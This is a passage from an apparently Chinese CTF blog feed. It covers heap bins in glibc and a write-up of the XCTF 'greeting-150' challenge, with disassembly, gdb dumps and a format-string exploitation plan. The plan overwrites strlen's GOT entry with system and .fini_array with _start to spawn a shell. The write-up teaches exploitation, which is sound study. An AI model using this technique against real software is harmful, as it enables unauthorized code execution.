class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000020fd1</span><span class="token number">0x602040</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span></code></pre><p>free之后user_data的前8字节数据被清空，但是没有清空后面的\n 。这里咱们留一个伏笔~~，再输入AAAAAAAABBBBBBBB试一试：</p><pre class=" language-java"><code class="language-java">──────────────────────────────────────────────────────────────<span class="token punctuation">[</span> <span class="token function">SOURCE</span> <span class="token punctuation">(</span>CODE<span class="token punctuation">)</span> <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────In file<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>test<span class="token punctuation">.</span>c    <span class="token number">4</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token number">5</span> <span class="token punctuation">{</span>    <span class="token number">6</span>     <span class="token keyword">void</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">7</span>     <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token number">8</span>     <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span> ►  <span class="token number">9</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token number">10</span> <span class="token punctuation">}</span>──────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────────<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffddb0</span> —▸ <span class="token number">0x7fffffffdea0</span> ◂— <span class="token number">0x1</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffddb8</span> —▸ <span class="token number">0x602010</span> ◂— <span class="token number">0x0</span><span class="token number">02</span><span class="token operator">:</span><span class="token number">0010</span>│ rbp  <span class="token number">0x7fffffffddc0</span> —▸ <span class="token function">0x400600</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15<span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│      <span class="token number">0x7fffffffddc8</span> —▸ <span class="token function">0x7ffff7a2d840</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">240</span><span class="token punctuation">)</span> ◂— mov    edi<span class="token punctuation">,</span> eax<span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│      <span class="token number">0x7fffffffddd0</span> ◂— <span class="token number">0x1</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffddd8</span> —▸ <span class="token number">0x7fffffffdea8</span> —▸ <span class="token number">0x7fffffffe24a</span> ◂— <span class="token string">'/home/matrix/a.out'</span><span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│      <span class="token number">0x7fffffffdde0</span> ◂— <span class="token number">0x1f7ffcca0</span><span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│      <span class="token number">0x7fffffffdde8</span> —▸ <span class="token function">0x4005b6</span> <span class="token punctuation">(</span>main<span class="token punctuation">)</span> ◂— push   rbp────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────── ► f <span class="token number">0</span>           4005f3 main<span class="token operator">+</span><span class="token number">61</span>   f <span class="token number">1</span>     7ffff7a2d840 __libc_start_main<span class="token operator">+</span><span class="token number">240</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token number">0x602000</span><span class="token number">0x602000</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span><span class="token number">0x602010</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x4242424242424242</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token number">0x602020</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602030</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000020fd1</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>top chunk<span class="token number">0x602040</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span><span class="token number">0x602050</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span></code></pre><p>果然后面的8字节不会被置零！想要解开这个谜团就不得不提到上古神将豳嗣了（bins）~~</p><h3 id="上古神将：bins"><a href="#上古神将：bins" class="headerlink" title="上古神将：bins"></a>上古神将：bins</h3><p>传说当时的chunks界物资浪费严重，operating system被渐渐掏空，造物主为了制衡派遣bins神去帮chunks们学习垃圾分类…..<br>bins共有4位：fastbins unsortedbin smallbin largebins。如同俄罗斯套娃，这四位bin也有各自的小将</p><pre class=" language-java"><code class="language-java">fastbins：专门回收小型垃圾（free chunks） 默认就是这<span class="token number">7</span>位，在32Bytes pallar world<span class="token operator">--</span>operating system  他们的大小除以<span class="token number">2</span>即可<span class="token number">0x20</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x30</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x40</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x50</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x60</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x70</span><span class="token operator">:</span> <span class="token number">0x0</span><span class="token number">0x80</span><span class="token operator">:</span> <span class="token number">0x0</span></code></pre><p>unsortedbin ：大将一人，且听下回分解<br>smallbins：且听下回分解<br>largebins：且听下回分解</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>free后的chunks会依据自己的完整大小放入不同的bins中，相应的也会清除某些数据但并不会全部清除。谜团众多请听下回分解~~。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-greeting_150</title>
      <link href="/2020/09/03/xctf-challenge-greeting-150/"/>
      <url>/2020/09/03/xctf-challenge-greeting-150/</url>
      
        <content type="html"><![CDATA[<p>昨天好不容易装上pwndbg，总是因为最后./setup时报错，说python3.6找不到命令，在网上找了很多教程都没用，最后把了解到pwndbg相当于一个加强版的gdb，然后我就把gdb删了就顺利装上了😭<br>废话少说，回到题目~~</p><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ checksec greeting<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/greeting'</span>    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    No RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span></code></pre><p>开启NX和Canary</p><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-84h]</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+5Ch] [ebp-44h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+9Ch] [ebp-4h]</span>  v6 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please tell me your name... "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">getnline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Don't ignore me ;( "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"Nice to meet you, %s :)\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">getline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>size_t __cdecl <span class="token function">getnline</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span>    <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">nao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">int</span> <span class="token function">nao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo \"Hello, I'm nao\"!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>关键函数：</p><ul><li>getline就是DIY了一个读取函数，一直到换行符结束(0xa==10)读取，并最后将换行符换做截至符\x00</li><li>nao函数，明显是一个hint，调用system函数输出：Hello, I’m nao</li><li>最后printf存在fmt漏洞</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们来看看程序执行情况：</p><pre><code>hunter@hunter:~/PWN/XCTF/xctf_challenge$ ./greeting Hello, I&#39;m nao!Please tell me your name... AAAANice to meet you, AAAA :)</code></pre><p>结合IDA主函数分析，按理不应该出现：Hello, I’m nao! 在main函数中并没有调用nao函数的地方。</p><p>利用IDA查看交叉引用的功能：<br><img src="https://s1.ax1x.com/2020/09/03/wC6zs1.png" alt=""></p><p>继续进入查看：</p><pre class=" language-java"><code class="language-java">text<span class="token operator">:</span><span class="token number">08048708</span> loc_8048708<span class="token operator">:</span>                            <span class="token punctuation">;</span> CODE XREF<span class="token operator">:</span> __libc_csu_init<span class="token operator">+</span><span class="token number">57</span>↓j<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048708</span>                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token operator">+</span>arg_8<span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token operator">:</span>0804870C                 mov     <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token operator">+</span>var_2C<span class="token punctuation">]</span><span class="token punctuation">,</span> ebp<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0804870F</span>                 mov     <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token operator">+</span>var_24<span class="token punctuation">]</span><span class="token punctuation">,</span> eax<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048713</span>                 mov     eax<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token operator">+</span>arg_4<span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048717</span>                 mov     <span class="token punctuation">[</span>esp<span class="token operator">+</span>2Ch<span class="token operator">+</span>var_28<span class="token punctuation">]</span><span class="token punctuation">,</span> eax<span class="token punctuation">.</span>text<span class="token operator">:</span>0804871B                 call    ds<span class="token operator">:</span><span class="token punctuation">(</span>__frame_dummy_init_array_entry <span class="token operator">-</span> 8049A28h<span class="token punctuation">)</span><span class="token punctuation">[</span>ebx<span class="token operator">+</span>edi<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">]</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">=</span>此处调用<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048722</span>                 add     edi<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048725</span>                 cmp     edi<span class="token punctuation">,</span> esi<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048727</span>                 jnz     <span class="token keyword">short</span> loc_8048708<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">08048729</span>继续进入：<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C __frame_dummy_init_array_entry dd offset frame_dummy<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> LOAD<span class="token operator">:</span>0804809C↑o<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> __libc_csu_init<span class="token operator">+</span><span class="token number">23</span>↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> Alternative name is <span class="token string">'__init_array_start'</span><span class="token punctuation">.</span>init_array<span class="token operator">:</span><span class="token number">08049930</span>                 dd offset nao<span class="token punctuation">.</span>init_array<span class="token operator">:</span><span class="token number">08049930</span> _init_array     ends</code></pre><p>也就是说nao函数先是由<strong>libc_csu_init执行到call    ds:(</strong>frame_dummy_init_array_entry - 8049A28h)[ebx+edi*4]，然后在此地址上存放了nao函数的偏移，由此进行调用。</p><h3 id="新姿势"><a href="#新姿势" class="headerlink" title="新姿势"></a>新姿势</h3><p>我们在用gdb调试的时候，执行完程序不难发现程序会ret到<strong>libc_start_main，所以main函数并不是程序真正开始的地方。程序会先进一些初始化函数如</strong>libc_start_main才会调用main函数。<br>然而在调用初始化函数之前会先调用_start，而_start就是程序真正的入口（Enter Point）</p><p>初始化函数<strong>libc_csu_init是比较常见的，就是在这里上面的程序调用nao函数。<br>那么有初始话函数也就会有对应的末“始”化函数：</strong>libc_csu_fini。他们就像俩兄弟一样，很像</p><p><strong>在程序中存在一种很神秘的段，其名为.init_array，此物存有函数指针，在进行<strong>libc_csu_init函数时，将会调用每一个指针。相似的，在程序中存在.fini_array段，也存放函数指针，在进行</strong>libc_csu_fini函数时便会调用每一个指针。这两处都是可写的 ，那么可以干坏事了（doge）</strong></p><p>这里存放的都是香喷喷的指针</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C <span class="token punctuation">;</span> ELF Initialization Function Table<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C <span class="token punctuation">;</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C <span class="token punctuation">;</span> Segment type<span class="token operator">:</span> Pure data<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C <span class="token punctuation">;</span> Segment permissions<span class="token operator">:</span> Read<span class="token operator">/</span>Write<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C _init_array     segment dword <span class="token keyword">public</span> <span class="token string">'DATA'</span> use32<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                 assume cs<span class="token operator">:</span>_init_array<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                 <span class="token punctuation">;</span>org 804992Ch<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C __frame_dummy_init_array_entry dd offset frame_dummy<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> LOAD<span class="token operator">:</span>0804809C↑o<span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> __libc_csu_init<span class="token operator">+</span><span class="token number">23</span>↑o <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>init_array<span class="token operator">:</span>0804992C                                         <span class="token punctuation">;</span> Alternative name is <span class="token string">'__init_array_start'</span><span class="token punctuation">.</span>init_array<span class="token operator">:</span><span class="token number">08049930</span>                 dd offset nao<span class="token punctuation">.</span>init_array<span class="token operator">:</span><span class="token number">08049930</span> _init_array     ends<span class="token punctuation">.</span>init_array<span class="token operator">:</span><span class="token number">08049930</span><span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> <span class="token punctuation">;</span> ELF Termination Function Table<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> <span class="token punctuation">;</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span><span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> <span class="token punctuation">;</span> Segment type<span class="token operator">:</span> Pure data<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> <span class="token punctuation">;</span> Segment permissions<span class="token operator">:</span> Read<span class="token operator">/</span>Write<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> _fini_array     segment dword <span class="token keyword">public</span> <span class="token string">'DATA'</span> use32<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span>                 assume cs<span class="token operator">:</span>_fini_array<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span>                 <span class="token punctuation">;</span>org 8049934h<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span>                                         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> __libc_csu_init<span class="token operator">+</span><span class="token number">18</span>↑o<span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> _fini_array     ends                    <span class="token punctuation">;</span> Alternative name is <span class="token string">'__init_array_end'</span><span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span></code></pre><h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><ul><li>存在fmt漏洞并且没有开启RELRO，可以对got表进行覆盖</li><li>有system函数，没有/bin/sh字符串，那么势必要进行两次输入，执行程序两次</li><li>fini_array可以覆盖，控制程序流程</li><li>payload最长46个字节</li></ul><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>构造payload将strlen的got表覆盖为system_plt</li><li>覆盖.fini_array的一处指针为start地址</li><li>读入/bin/sh直接获取shell</li></ul><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>因为payload长度有限制，所以不太适合用fmtstr_payload模块，必须自己精心构造<br>查看fini_array   0x08049934 处的指针：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>fini_array<span class="token operator">:</span><span class="token number">08049934</span> __do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux__do_global_dtors_aux：<span class="token punctuation">.</span>text<span class="token operator">:</span>080485A0 __do_global_dtors_aux proc near         <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> <span class="token punctuation">.</span>fini_array<span class="token operator">:</span>__do_global_dtors_aux_fini_array_entry↓o<span class="token punctuation">.</span>text<span class="token operator">:</span>080485A0                 cmp     ds<span class="token operator">:</span>completed_6591<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token operator">:</span>080485A7                 jnz     <span class="token keyword">short</span> locret_80485BC<span class="token punctuation">.</span>text<span class="token operator">:</span>080485A9                 push    ebp<span class="token punctuation">.</span>text<span class="token operator">:</span>080485AA                 mov     ebp<span class="token punctuation">,</span> esp<span class="token punctuation">.</span>text<span class="token operator">:</span>080485AC                 sub     esp<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">.</span>text<span class="token operator">:</span>080485AF                 call    deregister_tm_clones<span class="token punctuation">.</span>text<span class="token operator">:</span>080485B4                 mov     ds<span class="token operator">:</span>completed_6591<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">.</span>text<span class="token operator">:</span>080485BB                 leave</code></pre><p>所以指针的值为080485A0 ,用gdb查看更为直观</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10x <span class="token number">0x08049934</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>fini_array<span class="token number">0x8049934</span><span class="token operator">:</span>    <span class="token number">0x080485a0</span>    <span class="token number">0x00000000</span>    <span class="token number">0x00000001</span>    <span class="token number">0x00000001</span><span class="token number">0x8049944</span><span class="token operator">:</span>    <span class="token number">0x0000000c</span>    <span class="token number">0x08048404</span>    <span class="token number">0x0000000d</span>    <span class="token number">0x08048780</span><span class="token number">0x8049954</span><span class="token operator">:</span>    <span class="token number">0x00000019</span>    <span class="token number">0x0804992c</span>pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10x <span class="token number">0x080485a0</span><span class="token number">0x80485a0</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x9aa43d80</span>    <span class="token number">0x75000804</span>    <span class="token number">0xe5895513</span>    <span class="token number">0xe808ec83</span><span class="token number">0x80485b0</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0xffffff7c</span>    <span class="token number">0x9aa405c6</span>    <span class="token number">0xc9010804</span>    <span class="token number">0x9066c3f3</span><span class="token number">0x80485c0</span> <span class="token operator">&lt;</span>frame_dummy<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x049938a1</span>    <span class="token number">0x74c08508</span>pwndbg<span class="token operator">></span> x<span class="token operator">/</span>10i <span class="token number">0x080485a0</span>   <span class="token number">0x80485a0</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">></span><span class="token operator">:</span>    cmp    BYTE PTR ds<span class="token operator">:</span><span class="token number">0x8049aa4</span><span class="token punctuation">,</span><span class="token number">0x0</span>   <span class="token number">0x80485a7</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">7</span><span class="token operator">></span><span class="token operator">:</span>    jne    <span class="token number">0x80485bc</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">28</span><span class="token operator">></span>   <span class="token number">0x80485a9</span> <span class="token operator">&lt;</span>__do_global_dtors_aux<span class="token operator">+</span><span class="token number">9</span><span class="token operator">></span><span class="token operator">:</span>    push   ebp</code></pre><p>所以我们需要的地址如下：</p><pre class=" language-java"><code class="language-java">fini_array <span class="token operator">=</span> <span class="token number">0x08049934</span>  <span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">0x080485A0</span> system_plt <span class="token operator">=</span> <span class="token number">0x08048490</span>strlen_got <span class="token operator">=</span> <span class="token number">0x08049A54</span>  <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span>strlen_addrstart <span class="token operator">=</span>      <span class="token number">0x080484F0</span> </code></pre><p>发现0x080485A0 地址和start地址只有最后两字节不同所以要打印的字符串最少（%n），然后就是向strlen_got中覆盖system_plt。<br>如果直接把0x08048490一次全部覆盖那么要打印：128MB的大小</p><pre class=" language-java"><code class="language-java">In <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x08048490</span>Out<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">134513808</span>In <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">134513808</span><span class="token operator">/</span><span class="token number">1024</span>Out<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">131361</span>In <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">131361</span><span class="token operator">/</span><span class="token number">1024</span>Out<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">128</span></code></pre><blockquote><p>如果我们所有的试验都是在本机/虚拟机和docker之间进行，不会受到网络环境的影响。而在实际的比赛和漏洞利用环境中，一次性传输如此大量的数据可能会导致网络卡顿甚至中断连接。所以不能这么暴力，所以说还是得精心构造~~，要使打印的数据尽量少。<br>所以我们覆盖那些覆盖量少的地址，这样就能有效减少打印数据量。<br>那么应该是先让把fini_array 里面的地址覆盖为start,两个字节（hn）.然后也分两个字节（hn）覆盖strlen_got里面的地址（strlen_addr）。注意这是小端序即高地址存放高字节数据，低地址存放低字节数据</p></blockquote><pre class=" language-java"><code class="language-java">举例：var <span class="token operator">=</span> <span class="token number">0x11223344</span>，对于这个变量的最高字节为<span class="token number">0x11</span>，最低字节为<span class="token function">0x44</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>大端模式存储（存储地址为<span class="token number">16</span>位）地址                    数据<span class="token function">0x0004</span><span class="token punctuation">(</span>高地址<span class="token punctuation">)</span>     <span class="token number">0x44</span><span class="token number">0x0003</span>                 <span class="token number">0x33</span><span class="token number">0x0002</span>                 <span class="token number">0x22</span><span class="token function">0x0001</span><span class="token 